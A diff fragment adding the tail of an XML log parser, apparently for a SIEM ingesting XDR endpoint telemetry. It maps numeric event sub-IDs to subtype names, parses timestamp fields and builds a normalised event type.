+        <setEventAttribute attr="subtype">XDR_PROCESS_CREATE</setEventAttribute>
+      </when>
+      <when test="$_eventSubId = '3'">
+        <setEventAttribute attr="subtype">XDR_PROCESS_TERMINATE</setEventAttribute>
+      </when>
+      <when test="$_eventSubId = '4'">
+        <setEventAttribute attr="subtype">XDR_PROCESS_LOAD_IMAGE</setEventAttribute>
+      </when>
+      <when test="$_eventSubId = '5'">
+        <setEventAttribute attr="subtype">TELEMETRY_PROCESS_EXECUTE</setEventAttribute>
+      </when>
+      <when test="$_eventSubId = '6'">
+        <setEventAttribute attr="subtype">TELEMETRY_PROCESS_CONNECT</setEventAttribute>
+      </when>
+      <when test="$_eventSubId = '7'">
+        <setEventAttribute attr="subtype">TELEMETRY_PROCESS_TRACME</setEventAttribute>
+      </when>
+      <when test="$_eventSubId = '101'">
+        <setEventAttribute attr="subtype">XDR_FILE_CREATE</setEventAttribute>
+      </when>
+      <when test="$_eventSubId = '102'">
+        <setEventAttribute attr="subtype">XDR_FILE_OPEN</setEventAttribute>
+      </when>
+      <when test="$_eventSubId = '103'">
+        <setEventAttribute attr="subtype">XDR_FILE_DELETE</setEventAttribute>
+      </when>
+      <when test="$_eventSubId = '104'">
+        <setEventAttribute attr="subtype">XDR_FILE_SET_SECURITY</setEventAttribute>
+      </when>
+      <when test="$_eventSubId = '105'">
+        <setEventAttribute attr="subtype">XDR_FILE_COPY</setEventAttribute>
+      </when>
+      <when test="$_eventSubId = '106'">
+        <setEventAttribute attr="subtype">XDR_FILE_MOVE</setEventAttribute>
+      </when>
+      <when test="$_eventSubId = '107'">
+        <setEventAttribute attr="subtype">XDR_FILE_CLOSE</setEventAttribute>
+      </when>
+      <when test="$_eventSubId = '108'">
+        <setEventAttribute attr="subtype">TELEMETRY_FILE_MODIFY_TIMESTAMP</setEventAttribute>
+      </when>
+      <when test="$_eventSubId = '109'">
+        <setEventAttribute attr="subtype">TELEMETRY_FILE_MODIFY</setEventAttribute>
+      </when>
+      <when test="$_eventSubId = '201'">
+        <setEventAttribute attr="subtype">XDR_CONNECTION_CONNECT</setEventAttribute>
+      </when>
+      <when test="$_eventSubId = '202'">
+        <setEventAttribute attr="subtype">XDR_CONNECTION_LISTEN</setEventAttribute>
+      </when>
+      <when test="$_eventSubId = '203'">
+        <setEventAttribute attr="subtype">XDR_CONNECTION_CONNECT_INBOUND</setEventAttribute>
+        <setEventAttribute attr="direction">inbound</setEventAttribute>
+      </when>
+      <when test="$_eventSubId = '204'">
+        <setEventAttribute attr="subtype">XDR_CONNECTION_CONNECT_OUTBOUND</setEventAttribute>
+        <setEventAttribute attr="direction">outbound</setEventAttribute>
+      </when>
+      <when test="$_eventSubId = '301'">
+        <setEventAttribute attr="subtype">XDR_DNS_QUERY</setEventAttribute>
+      </when>
+      <when test="$_eventSubId = '401'">
+        <setEventAttribute attr="subtype">XDR_REGISTRY_CREATE</setEventAttribute>
+      </when>
+      <when test="$_eventSubId = '402'">
+        <setEventAttribute attr="subtype">XDR_REGISTRY_SET</setEventAttribute>
+      </when>
+      <when test="$_eventSubId = '403'">
+        <setEventAttribute attr="subtype">XDR_REGISTRY_DELETE</setEventAttribute>
+      </when>
+      <when test="$_eventSubId = '404'">
+        <setEventAttribute attr="subtype">XDR_REGISTRY_RENAME</setEventAttribute>
+      </when>
+      <when test="$_eventSubId = '501'">
+        <setEventAttribute attr="subtype">XDR_ACCOUNT_ADD</setEventAttribute>
+      </when>
+      <when test="$_eventSubId = '502'">
+        <setEventAttribute attr="subtype">XDR_ACCOUNT_DELETE</setEventAttribute>
+      </when>
+      <when test="$_eventSubId = '503'">
+        <setEventAttribute attr="subtype">XDR_ACCOUNT_IMPERSONATE</setEventAttribute>
+      </when>
+      <when test="$_eventSubId = '504'">
+        <setEventAttribute attr="subtype">XDR_ACCOUNT_MODIFY</setEventAttribute>
+      </when>
+      <when test="$_eventSubId = '601'">
+        <setEventAttribute attr="subtype">XDR_INTERNET_OPEN</setEventAttribute>
+      </when>
+      <when test="$_eventSubId = '602'">
+        <setEventAttribute attr="subtype">XDR_INTERNET_CONNECT</setEventAttribute>
+      </when>
+      <when test="$_eventSubId = '603'">
+        <setEventAttribute attr="subtype">XDR_INTERNET_DOWNLOAD</setEventAttribute>
+      </when>
+      <when test="$_eventSubId = '701'">
+        <setEventAttribute attr="subtype">XDR_MODIFIED_PROCESS_CREATE_REMOTETHREAD</setEventAttribute>
+      </when>
+      <when test="$_eventSubId = '702'">
+        <setEventAttribute attr="subtype">XDR_MODIFIED_PROCESS_WRITE_MEMORY</setEventAttribute>
+      </when>
+      <when test="$_eventSubId = '703'">
+        <setEventAttribute attr="subtype">TELEMETRY_MODIFIED_PROCESS_WRITE_PROCESS</setEventAttribute>
+      </when>
+      <when test="$_eventSubId = '704'">
+        <setEventAttribute attr="subtype">TELEMETRY_MODIFIED_PROCESS_READ_PROCESS</setEventAttribute>
+      </when>
+      <when test="$_eventSubId = '705'">
+        <setEventAttribute attr="subtype">TELEMETRY_MODIFIED_PROCESS_WRITE_PROCESS_NAME</setEventAttribute>
+      </when>
+      <when test="$_eventSubId = '801'">
+        <setEventAttribute attr="subtype">XDR_WINDOWS_HOOK_SET</setEventAttribute>
+      </when>
+      <when test="$_eventSubId = '901'">
+        <setEventAttribute attr="subtype">XDR_AMSI_EXECUTE</setEventAttribute>
+      </when>
+      <when test="$_eventSubId = '1001'">
+        <setEventAttribute attr="subtype">TELEMETRY_MEMORY_MODIFY</setEventAttribute>
+      </when>
+      <when test="$_eventSubId = '1002'">
+        <setEventAttribute attr="subtype">TELEMETRY_MEMORY_MODIFY_PERMISSION</setEventAttribute>
+      </when>
+      <when test="$_eventSubId = '1003'">
+        <setEventAttribute attr="subtype">TELEMETRY_MEMORY_READ</setEventAttribute>
+      </when>
+      <when test="$_eventSubId = '1101'">
+        <setEventAttribute attr="subtype">TELEMETRY_BM_INVOKE</setEventAttribute>
+      </when>
+      <when test="$_eventSubId = '1102'">
+        <setEventAttribute attr="subtype">TELEMETRY_BM_INVOKE_API</setEventAttribute>
+      </when>
+      <otherwise>
+        <setEventAttribute attr="subtype">$_eventSubId</setEventAttribute>
+      </otherwise>
+    </choose>
+
+    <when test="exist _createTime">
+      <switch>
+        <case>
+          <collectFieldsByRegex src="$_createTime">
+            <regex><![CDATA[<_year:gPatYear>-<_mon:gPatMonNum>-<_day:gPatDay>T<_time:gPatTime><_tz:gPatTimeZone>]]></regex>
+          </collectFieldsByRegex>
+          <setEventAttribute attr="createTime">toDateTime($_mon, $_day, $_year, $_time, $_tz)</setEventAttribute>
+        </case>
+        <default/>
+      </switch>
+    </when>
+    <when test="exist _updateTime">
+      <switch>
+        <case>
+          <collectFieldsByRegex src="$_updateTime">
+            <regex><![CDATA[<_year:gPatYear>-<_mon:gPatMonNum>-<_day:gPatDay>T<_time:gPatTime><_tz:gPatTimeZone>]]></regex>
+          </collectFieldsByRegex>
+          <setEventAttribute attr="updateTime">toDateTime($_mon, $_day, $_year, $_time, $_tz)</setEventAttribute>
+        </case>
+        <default/>
+      </switch>
+    </when>
+
+    <when test="exist _firstSeen">
+      <switch>
+        <case>
+          <collectFieldsByRegex src="$_firstSeen">
+            <regex><![CDATA[<_fsYear:gPatYear>-<_fsMon:gPatMonNum>-<_fsDay:gPatDay>T<_fsTime:gPatTime><_fsTz:gPatTimeZone>]]></regex>
+          </collectFieldsByRegex>
+          <setEventAttribute attr="firstSeenTime">toDateTime($_fsMon, $_fsDay, $_fsYear, $_fsTime, $_fsTz)</setEventAttribute>
+        </case>
+        <default/>
+      </switch>
+    </when>
+
+    <when test="exist _lastSeen">
+      <switch>
+        <case>
+          <collectFieldsByRegex src="$_lastSeen">
+            <regex><![CDATA[<_lsYear:gPatYear>-<_lsMon:gPatMonNum>-<_lsDay:gPatDay>T<_lsTime:gPatTime><_lsTz:gPatTimeZone>]]></regex>
+          </collectFieldsByRegex>
+          <setEventAttribute attr="lastSeenTime">toDateTime($_lsMon, $_lsDay, $_lsYear, $_lsTime, $_lsTz)</setEventAttribute>
+        </case>
+        <default/>
+      </switch>
+    </when>
+
+    <when test="exist _eventTime">
+      <switch>
+        <case>
+          <collectFieldsByRegex src="$_eventTime">
+            <regex><![CDATA[<_year:gPatYear>-<_mon:gPatMonNum>-<_day:gPatDay>T<_time:gPatTime>(?:\.\d+)?<_tz:gPatTimeZone>]]></regex>
+          </collectFieldsByRegex>
+          <setEventAttribute attr="eventTime">toDateTime($_mon, $_day, $_year, $_time, $_tz)</setEventAttribute>
+        </case>
+        <case>
+          <setEventAttribute attr="eventTime">divide($_eventTime, 1000)</setEventAttribute>
+        </case>
+        <default/>
+      </switch>
+    </when>
+
+    <!-- normalize action -->
+    <when test="exist action">
+      <when test="not_exist fwAction">
+        <setEventAttribute attr="fwAction">$action</setEventAttribute>
+      </when>
+    </when>
+
+    <choose>
+      <!-- Subtype is more specific, duplicative to include type-subtype if both present -->
+      <when test="exist subtype">
+        <setEventAttribute attr="eventType">combineMsgId($eventType,"_", $subtype)</setEventAttribute>
+      </when>
+      <when test="exist type">
+        <setEventAttribute attr="eventType">combineMsgId($eventType,"_", $type)</setEventAttribute>
+      </when>
+    </choose>
+    <!-- for other non conforming events -->
+    <when test="exist activityName">
+      <setEventAttribute attr="eventType">combineMsgId($eventType,"_", $activityName)</setEventAttribute>
+    </when>
+
+    <!-- Remove special characters from event type -->
+    <setEventAttribute attr="eventType">replaceStringByRegex($eventType, "[\s_\.:]+", "_")</setEventAttribute>
+
+  </parsingInstructions>
+</eventParser>
